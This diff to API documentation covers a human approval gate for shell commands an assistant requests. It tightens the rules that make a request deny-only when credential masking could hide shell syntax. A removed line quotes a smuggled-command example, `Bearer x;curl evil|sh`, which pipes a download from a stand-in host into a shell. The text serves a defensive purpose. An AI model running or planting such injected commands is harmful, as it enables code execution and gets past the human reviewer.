@@ -256,13 +256,14 @@ be denied). `GET /api/v1/assistant-action-requests/<id>` also returns `display_f
 `display` when nothing was cut); the list never carries it. To **approve** a request whose `display_complete` is false,
 send `{"approve": true, "display_sha256": "<SHA-256 hex of display_full, UTF-8>"}`; a missing or wrong hash is 409
 `truncated_display` and nothing is recorded. Denying never needs a hash. A request is deny-only (`approvable` false,
-409 even with the hash) when the command is over the 8192-byte cap, or when masking removed or rewrote any shell syntax
-(`$ \` ; | & ( ) < >`), whitespace or normalisable character (checked generically over every mask, including the
-token-shape scrubber), because the `***` could hide a command; its display ends in `…(masked shell syntax not shown)`.
-Only the credential itself is masked in an auth header, `Bearer`, `Basic`, `token` or `Worker <id>`: it is one run without
-blanks or shell syntax, so `curl -H "Authorization: Bearer ***" https://example` stays approvable and shows the URL, and
-`Authorization: Bearer x;curl evil|sh` shows `;curl evil|sh`. A value that really holds blanks or shell syntax (a cookie
-with spaces, a value hiding `$(`) stays deny-only. A row stored before `display_full` existed is approvable only when its display is complete.
+409 even with the hash) when the command is over the 8192-byte cap, when its rendering is over 16384 characters (cut),
+or when any mask replaced a character outside `[A-Za-z0-9._~+/=-]` (a quote, backslash, blank, `&`, `;`, `|`, `$`, `@`,
+`:`, `{`, anything non-ASCII), because the `***` could hide a command; its display ends in
+`…(masked shell syntax not shown)`. Every scrubber runs over the whole text. So `curl -H "Authorization: Bearer abc.DEF-123"
+https://example` stays approvable and shows the URL, while a JSON password with `&`, a `user:pass@` URL or
+`Bearer abc;def` is deny-only. `display_sha256` must be 64 hex characters (any case), else 400. Invisible characters
+(controls, format, separators, private-use, unassigned, `U+FFA0`, variation selectors) are shown as `⟨U+XXXX⟩` tokens.
+A row stored before `display_full` existed is approvable only when its display is complete.
 
 CLI: `assistant-action show ID` prints the full text and `display_sha256`. `assistant-action approve ID` on a cut
 command asks `Approve exactly this command? [y/N]` on a terminal; off a terminal it needs `--display-sha256 <hash>` from
